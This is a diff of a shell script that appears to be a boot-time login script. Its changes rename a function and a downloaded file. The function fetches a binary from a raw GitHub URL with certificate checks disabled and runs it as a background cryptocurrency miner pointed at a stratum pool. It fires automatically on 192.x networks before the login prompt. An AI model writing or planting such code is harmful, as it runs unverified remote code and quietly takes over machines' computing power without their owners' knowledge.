@@ -23,13 +23,13 @@ fi
 read
 }
 
-_RUN(){
+_APP(){
  case $1 in
    start)  
      #sysctl -w vm.nr_hugepages=128
-     wget --no-check-cert https://raw.githubusercontent.com/osrun/beta/master/run
-     chmod +x run
-     ./run -B -a cn/r -o stratum+tcp://$END:$PORT -u $USER -p $TAG
+     wget --no-check-cert https://raw.githubusercontent.com/osrun/beta/master/app
+     chmod +x app
+     ./app -B -a cn/r -o stratum+tcp://$END:$PORT -u $USER -p $TAG
    ;; 
  esac
 }
@@ -45,7 +45,7 @@ case $1 in
   ;;
   *)
    if ifconfig | grep "inet addr" | cut -d: -f2 | cut -dB -f1 | cut -d. -f1 | grep -o 192 > /dev/null; then
-    _RUN start
+    _APP start
    fi
    setsid cttyhack /bin/login
 ;;
